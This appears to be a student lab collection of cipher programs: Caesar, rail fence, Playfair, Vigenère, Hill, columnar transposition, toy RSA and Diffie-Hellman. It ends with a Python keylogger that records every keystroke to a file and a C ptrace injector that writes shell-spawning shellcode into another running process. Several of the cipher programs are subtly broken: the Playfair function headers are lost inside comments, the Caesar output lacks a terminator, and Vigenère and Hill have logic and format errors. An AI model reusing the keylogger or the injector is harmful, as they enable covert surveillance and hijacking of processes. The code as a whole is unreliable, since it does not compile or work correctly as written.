# Caeser Cipher
```
#include <stdio.h>
#include <string.h>
#include <ctype.h>

void encrypt(char text[], int shift)
{
    char result[100];
    
    for(int i=0; i<strlen(text); i++)
    {
       if(isalpha(text[i]))
       {
           if(isupper(text[i]))
           {
               result[i] = (char)(((int)text[i] - 65 + shift) % 26 + 65);
           }
           else
           {
            result[i] = (char)(((int)text[i] - 97 + shift) % 26 + 97);
           }
       }
    }
    printf("%s", result);
}

void decrypt(char text[], int shift)
{
    char result[100];
    
    for(int i=0; i<strlen(text); i++)
    {
        if(isalpha(text[i])){
            if(isupper(text[i]))
           {
               result[i] = (char)(((int)text[i] - 65 - shift + 26) % 26 + 65);
           }
           else
           {
            result[i] = (char)(((int)text[i] - 97 - shift + 26) % 26 + 97);
           }
        }
    }
    printf("%s", result);
}

int main()
{
    int ascii;
    int shift;
    char text[100];
    int option;

    printf("1. Encryption\n2. Decryption\n3. Exit\n");
    printf("Enter your Option: ");
    scanf("%d", &option);
    printf("Enter text: ");
    scanf("%s", text);
    printf("Enter shift value: ");
    scanf("%d", &shift);
    
    if(option == 1)
        encrypt(text, shift);
    else if(option == 2)
        decrypt(text, shift);
    else 
        printf("Enter a valid option");    

    printf("\n");

    return 0;
    
}
```

# Railfence Cipher
```
#include<stdio.h>
#include<string.h>

void encrypt(char msg[], int key){
    int msgLen = strlen(msg), i, j, k = -1, row = 0, col = 0;
    char railMatrix[key][msgLen];

    for(i = 0; i < key; ++i)
        for(j = 0; j < msgLen; ++j)
            railMatrix[i][j] = '\n';

    for(i = 0; i < msgLen; ++i){
        railMatrix[row][col++] = msg[i];

        if(row == 0 || row == key-1)
            k= k * (-1);

        row = row + k;
    }

    printf("\nEncrypted Message: ");

    for(i = 0; i < key; ++i)
        for(j = 0; j < msgLen; ++j)
            if(railMatrix[i][j] != '\n')
                printf("%c", railMatrix[i][j]);
}



void decrypt(char msg[], int key){
    int msgLen = strlen(msg), i, j, k = -1, row = 0, col = 0, m = 0;
    char railMatrix[key][msgLen];

    for(i = 0; i < key; ++i)
        for(j = 0; j < msgLen; ++j)
            railMatrix[i][j] = '\n';

    for(i = 0; i < msgLen; ++i){
        railMatrix[row][col++] = '*';

        if(row == 0 || row == key-1)
            k= k * (-1);

        row = row + k;
    }

    for(i = 0; i < key; ++i)
        for(j = 0; j < msgLen; ++j)
            if(railMatrix[i][j] == '*')
                railMatrix[i][j] = msg[m++];

    row = col = 0;
    k = -1;

    printf("\nDecrypted Message: ");

    for(i = 0; i < msgLen; ++i){
        printf("%c", railMatrix[row][col++]);

        if(row == 0 || row == key-1)
            k= k * (-1);

        row = row + k;
    }
}

int main()
{
    int ascii;
    int k;
    char msg[100];
    int op;

        printf("1. Encryption\n2. Decryption\n 3.Exit");
        printf("\nEnter your Option: ");
        scanf("%d", &op);
        printf("Enter the msg/cypher : ");
        scanf("%s", msg);
        printf("Enter the Key : ");
        scanf("%d", &k);
        if(op == 1)
            encrypt(msg, k);
        else if(op == 2)
            decrypt(msg, k);
        else  if(op == 3)
            printf("Thankyou... Exiting ");
        else 
            printf("Enter a valid option");
            
        printf("\n");
    return 0;
}
```

# Playfair Cipher
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define SIZE 30
// Function to convert the string to lowercase
void toLowerCase(char plain[], int ps)
{
    int i;
    for (i = 0; i < ps; i++)
    {
        if (plain[i] > 64 && plain[i] < 91)
            plain[i] += 32;
    }
}
// Function to remove all spaces in a string
int removeSpaces(char *plain, int ps)
{
    int i, count = 0;
    for (i = 0; i < ps; i++)
        if (plain[i] != ' ')
            plain[count++] = plain[i];
    plain[count] = '\0';
    return count;
}
// Function to generate the 5x5 key square void generateKeyTable(char key[], int ks, char keyT[5][5]) {
int i, j, k, flag = 0, *dicty;
// a 26 character hashmap
// to store count of the alphabet
dicty = (int *)calloc(26, sizeof(int));
for (i = 0; i < ks; i++)
{
    if (key[i] != 'j')
        dicty[key[i] - 97] = 2;
}
dicty['j' - 97] = 1;
i = 0;
j = 0;
for (k = 0; k < ks; k++)
{
    if (dicty[key[k] - 97] == 2)
    {
        dicty[key[k] - 97] -= 1;
        keyT[i][j] = key[k];
        j++;
        if (j == 5)
        {
            i++;
            j = 0;
        }
    }
}
for (k = 0; k < 26; k++)
{
    if (dicty[k] == 0)
    {
        keyT[i][j] = (char)(k + 97);
        j++;
        if (j == 5)
        {
            i++;
            j = 0;
        }
    }
}
}
// Function to search for the characters of a digraph // in the key square and return their position void search(char keyT[5][5], char a, char b, int arr[]) {
int i, j;
if (a == 'j')
    a = 'i';
else if (b == 'j')
    b = 'i';
for (i = 0; i < 5; i++)
{
    for (j = 0; j < 5; j++)
    {
        if (keyT[i][j] == a)
        {
            arr[0] = i;
            arr[1] = j;
        }
        else if (keyT[i][j] == b)
        {
            arr[2] = i;
            arr[3] = j;
        }
    }
}
}
// Function to find the modulus with 5
int mod5(int a) { return (a % 5); }
// Function to make the plain text length to be even int prepare(char str[], int ptrs)
{
    if (ptrs % 2 != 0)
    {
        str[ptrs++] = 'z';
        str[ptrs] = '\0';
    }
    return ptrs;
}
// Function for performing the encryption
void encrypt(char str[], char keyT[5][5], int ps)
{
    int i, a[4];
    for (i = 0; i < ps; i += 2)
    {
        search(keyT, str[i], str[i + 1], a);
        if (a[0] == a[2])
        {
            str[i] = keyT[a[0]][mod5(a[1] + 1)];
            str[i + 1] = keyT[a[0]][mod5(a[3] + 1)];
        }
        else if (a[1] == a[3])
        {
            str[i] = keyT[mod5(a[0] + 1)][a[1]];
            str[i + 1] = keyT[mod5(a[2] + 1)][a[1]];
        }
        else
        {
            str[i] = keyT[a[0]][a[3]];
            str[i + 1] = keyT[a[2]][a[1]];
        }
    }
}
// Function to encrypt using Playfair Cipher
void encryptByPlayfairCipher(char str[], char key[])
{
    char ps, ks, keyT[5][5];
    // Key
    ks = strlen(key);
    ks = removeSpaces(key, ks);
    toLowerCase(key, ks);
    // Plaintext
    ps = strlen(str);
    toLowerCase(str, ps);
    ps = removeSpaces(str, ps);
    ps = prepare(str, ps);
    generateKeyTable(key, ks, keyT);
    encrypt(str, keyT, ps);
}
// Driver code
int main()
{
    char str[SIZE], key[SIZE];
    // Key to be encrypted
    // strcpy(key, "Monarchy");
    printf("Key text: ");
    gets(key);
    // Plaintext to be encrypted
    // strcpy(str, "instruments");
    printf("Plain text: ");
    gets(str);
    // encrypt using Playfair Cipher
    encryptByPlayfairCipher(str, key);
    printf("Cipher text: %s\n", str);
    return 0;
}
```
# Vignere Cipher
```
#include <stdio.h>
#include <string.h>
int main()
{
    char msg[100];
    char key[100];
    printf("Enter Plain Text: ");
    gets(msg);
    printf("Enter key: ");
    gets(key);
    int msgLen = strlen(msg), keyLen = strlen(key), i, j;
    char newKey[msgLen], encryptedMsg[msgLen], decryptedMsg[msgLen];
    // generating new key
    for (i = 0, j = 0; i < msgLen; ++i, ++j)
    {
        if (j == keyLen)
            j = 0;
        newKey[i] = key[j];
    }
    newKey[i] = '\0';
    // encryption
    for (i = 0; i < msgLen; ++i)
        encryptedMsg[i] = ((msg[i] + newKey[i]) % 26) + 'A';
    encryptedMsg[i] = '\0';
    // decryption
    for (i = 0; i < msgLen; ++i)
        decryptedMsg[i] = (((encryptedMsg[i] - newKey[i]) + 26) % 26) + 'A';
    decryptedMsg[i] = '\0';
    printf("\n\n");
    printf("Original Message: %s", msg);
    printf("\n\nKey: %s", key);
    printf("\n\nNew Generated Key: %s", newKey);
    printf("\n\nEncrypted Message: %s", encryptedMsg);
    printf("\n\nDecrypted Message: %s", decryptedMsg);
    return 0;
}
```
# Hill Cipher
```
#include <stdio.h>
#include <math.h>

float encrypt[3][1],
decrypt[3][1], a[3][3], b[3][3], mes[3][1], c[3][3];

void encryption();    // encrypts the message
void decryption();    // decrypts the message
void getKeyMessage(); // gets key and message from user
void inverse();       // finds inverse of key matrix

void main()
{
    getKeyMessage();
    encryption();
    decryption();
}

void encryption()
{
    int i, j, k;
    for (i = 0; i < 3; i++)
        for (j = 0; j < 1; j++)
            for (k = 0; k < 3; k++)
                encrypt[i][j] = encrypt[i][j] + a[i][k] * mes[k][j];

    printf("\nEncrypted string is: ");

    for (i = 0; i < 3; i++)
        printf("%c", (char)(fmod(encrypt[i][0], 26) + 97));
}

void decryption()
{
    int i, j, k;
    inverse();
    for (i = 0; i < 3; i++)
        for (j = 0; j < 1; j++)
            for (k = 0; k < 3; k++)
                decrypt[i][j] = decrypt[i][j] + b[i][k] * encrypt[k][j];

    printf("\nDecrypted string is: ");

    for (i = 0; i < 3; i++)
        printf("%c", (char)(fmod(decrypt[i][0], 26) + 97));
    printf("\n");
}

void getKeyMessage()
{
    int i, j;
    char msg[3];

    printf("Enter 3x3 matrix for key (It should be inversible):\n");

    for (i = 0; i < 3; i++)
        for (j = 0; j < 3; j++)
        {
            scanf("%f", &a[i][j]);
            c[i][j] = a[i][j];
        }

    printf("\nEnter a 3 letter string: ");

    scanf("%s", msg);

    for (i = 0; i < 3; i++)
        mes[i][0] = msg[i] - 97;
}

void inverse()
{
    int i, j, k;
    float p, q;
    for (i = 0; i < 3; i++)
        for (j = 0; j < 3; j++)
        {
            if (i == j)
                b[i][j] = 1;
            else
                b[i][j] = 0;
        }

    for (k = 0; k < 3; k++)
    {
        for (i = 0; i < 3; i++)
        {
            p = c[i][k];
            q = c[k][k];
            for (j = 0; j < 3; j++)
            {
                if (i != k)
                {
                    c[i][j] = c[i][j] * q - p * c[k][j];
                    b[i][j] = b[i][j] * q - p * b[k][j];
                }
            }
        }
    }

    for (i = 0; i < 3; i++)
        for (j = 0; j < 3; j++)
            b[i][j] = b[i][j] / c[i][i];

    printf("\n\nInverse Matrix is:\n");
    
    for (i = 0; i < 3; i++)
    {
        for (j = 0; j < 3; j++)
            printf("%d ", b[i][j]);
        printf("\n");
    }
}
```

# Columnar transposition matrix
```
#include <stdio.h>
int check(int x, int y)
{
    int a, b, c;

    if (x % y == 0)
        return 0;

    a = x / y;
    b = y * (a + 1);
    c = b - x;
    return c;
}
void main()
{
    int l1, i, d, j;

    printf("\nEnter the length of the key. ");
    scanf("%d", &l1);
    int sequence[l1];
    printf("\nEnter the sequence key. ");
    for (i = 0; i < l1; ++i)
    {
        scanf("%d", &sequence[i]);
    }

    int order[l1];
    for (i = 1; i <= l1; ++i)
    {
        for (j = 0; j < l1; ++j)
        {
            if (sequence[j] == i)
                order[i - 1] = j;
        }
    }

    printf("\nEnter the depth. ");
    scanf("%d", &d);

    int l2;
    printf("\nEnter the length of String without spaces . ");
    scanf("%d", &l2);
    int temp1 = check(l2, l1);

    int r = (l2 + temp1) / l1;

    char p[l2 + temp1];
    char p1[r][l1];
    // char p2[r][l1];
    if (temp1 > 0)
        printf("\nYou need to enter %d bogus characters.So enter total %d characters. ", temp1, (l2 + temp1));
    else
        printf("\nEnter the string. ");

    for (i = -1; i < (l2 + temp1); ++i)
    {
        scanf("%c", &p[i]);
    }
    int count = 0;
    while (d > 0)
    {
        count = 0;

        for (i = 0; i < r; ++i)
        {
            for (j = 0; j < l1; ++j)
            {
                p1[i][j] = p[count];
                count = count + 1;
            }
        }

        printf("\n\n\n");
        for (i = 0; i < r; ++i)
        {
            for (j = 0; j < l1; ++j)
            {
                printf("%c ", p1[i][j]);
            }
            printf("\n");
        }

        count = 0;
        for (i = 0; i < l1; ++i)
        {
            for (j = 0; j < r; ++j)
            {
                p[count] = p1[j][order[i]];
                count = count + 1;
            }
        }

        for (i = 0; i < (l2 + temp1); ++i)
            printf("%c ", p[i]);

        d = d - 1;
    }
}
```

# RSA
```
#include <stdio.h>
#include <math.h>

int gcd(int a, int h)
{
    int temp;
    while (1)
    {
        temp = a % h;
        if (temp == 0)
            return h;
        a = h;
        h = temp;
    }
}

int main()
{
    double p = 3;
    double q = 7;
    double n = p * q;
    double count;
    double totient = (p - 1) * (q - 1);

    double e = 2;

    while (e < totient)
    {
        count = gcd(e, totient);
        if (count == 1)
            break;
        else
            e++;
    }

    double d;
    double k = 2;

    d = (1 + (k * totient)) / e;
    double msg = 12;
    double c = pow(msg, e);
    double m = pow(c, d);
    c = fmod(c, n);
    m = fmod(m, n);

    printf("Message data = %.0lf", msg);
    printf("\np = %.0lf", p);
    printf("\nq = %.0lf", q);
    printf("\nn = pq = %.0lf", n);
    printf("\ntotient = %.0lf", totient);
    printf("\ne = %.0lf", e);
    printf("\nd = %.0lf", d);
    printf("\nEncrypted data = %.0lf", c);
    printf("\nOriginal Message Sent = %.0lf", m);
    return 0;
}
```

# Diffie Hellman
```
#include <stdio.h>
#include <math.h>

long long int power(long long int a, long long int b,
                    long long int P)
{
    if (b == 1)
        return a;

    else
        return (((long long int)pow(a, b)) % P);
}

int main()
{
    long long int P, G, x, a, y, b, ka, kb;

    P = 23;
    printf("The value of P : %lld\n", P);

    G = 9;
    printf("The value of G : %lld\n\n", G);

    a = 4;
    printf("The private key a for Alice : %lld\n", a);
    x = power(G, a, P);

    b = 3;
    printf("The private key b for Bob : %lld\n\n", b);
    y = power(G, b, P);

    ka = power(y, a, P);
    kb = power(x, b, P);

    printf("Secret key for the Alice is : %lld\n", ka);
    printf("Secret Key for the Bob is : %lld\n", kb);

    return 0;
}
```

# Keylogger
```
import os
import pyxhook


log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/file.log')
)

cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)


if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:

        pass


def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:

    pass
except Exception as ex:

    msg = 'Error while catching events:\n {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
```

# Code Injection
```
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>
# include <sys/wait.h>
# include <sys/ptrace.h>
# include <sys/user.h>
 

char shellcode[]={
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97"
"\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    };
 

void header()
{
    printf("----Memory bytecode injector-----\n");
}
 

int main(int argc,char**argv)
{
    int i,size,pid=0;
    struct user_regs_struct reg;
                                
                                
     
    char*buff;
     
    header();
     
    
     
    pid=atoi(argv[1]);
    size=sizeof(shellcode);
    
    buff=(char*)malloc(size);
    
    memset(buff,0x0,size);
    
    memcpy(buff,shellcode,sizeof(shellcode));
     
    
    ptrace(PTRACE_ATTACH,pid,0,0);
     
    
    wait((int*)0);
     
    
    
    
    ptrace(PTRACE_GETREGS,pid,0,&reg);
    printf("Writing EIP 0x%x, process %d\n",reg.eip,pid);
     
    
    for(i=0;i<size;i++){
    ptrace(PTRACE_POKETEXT,pid,reg.eip+i,*(int*)(buff+i));
}
    
    ptrace(PTRACE_DETACH,pid,0,0);
    free(buff);
    return 0;
     
}

```

